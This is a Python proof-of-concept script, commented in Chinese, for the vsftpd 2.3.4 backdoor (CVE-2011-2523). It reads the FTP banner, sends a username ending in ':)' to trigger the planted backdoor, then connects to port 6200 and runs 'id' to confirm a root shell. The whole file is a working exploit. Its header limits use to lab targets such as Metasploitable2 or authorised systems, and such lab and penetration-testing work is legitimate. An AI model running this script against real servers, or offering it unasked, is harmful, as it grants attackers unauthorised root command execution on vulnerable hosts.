#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vsftpd 2.3.4 笑脸漏洞（CVE-2011-2523）检测 PoC

原理：vsftpd 2.3.4 官方源码包中被植入后门，登录用户名以 ":)" 结尾时，
服务端会在 6200 端口打开一个 root 权限的 Shell，俗称"笑脸漏洞"。

用法：python smiley_poc.py <目标IP> [端口=21]
注意：仅用于自己搭建的靶机（如 Metasploitable2）或授权目标，请勿用于未授权系统。
"""
import socket
import sys


def recv_banner(sock):
    """读取服务端返回，超时则返回空串"""
    sock.settimeout(5)
    try:
        return sock.recv(1024).decode(errors="ignore")
    except socket.timeout:
        return ""


def main():
    if len(sys.argv) < 2:
        print(f"用法: python {sys.argv[0]} <目标IP> [端口]")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 21

    print(f"[*] 目标: {host}:{port}")

    # 1. 连接 FTP 端口，读取 banner 判断版本
    try:
        s = socket.create_connection((host, port), timeout=5)
    except Exception as e:
        print(f"[-] 无法连接 FTP 端口: {e}")
        sys.exit(1)
    banner = recv_banner(s)
    print(f"[*] Banner: {banner.strip()}")
    if "2.3.4" in banner:
        print("[+] 版本为 vsftpd 2.3.4，疑似存在笑脸漏洞")
    else:
        print("[-] 未识别到 2.3.4 版本，可能不存在该漏洞")
        s.close()
        sys.exit(1)

    # 2. 发送带 ":)" 的用户名触发后门
    s.sendall(b"USER test:)\r\n")
    print("[*] 已发送 USER test:)")
    print(f"[*] 服务端响应: {recv_banner(s).strip()}")
    s.sendall(b"PASS test\r\n")
    print(f"[*] 服务端响应: {recv_banner(s).strip()}")
    s.close()

    # 3. 检测 6200 端口是否开启（后门 Shell）
    try:
        back = socket.create_connection((host, 6200), timeout=5)
        print("[+] 6200 端口已开启，漏洞存在！")
        # 4. 连接后门 Shell 执行 id 命令，确认权限
        back.sendall(b"id\n")
        out = back.recv(1024).decode(errors="ignore")
        print(f"[+] 后门 Shell 执行 id 返回: {out.strip()}")
        if "uid=0" in out:
            print("[+] 确认获得 root 权限")
        back.close()
    except Exception as e:
        print("[-] 6200 端口未开启，漏洞不存在或未触发")
        print(f"    详情: {e}")


if __name__ == "__main__":
    main()
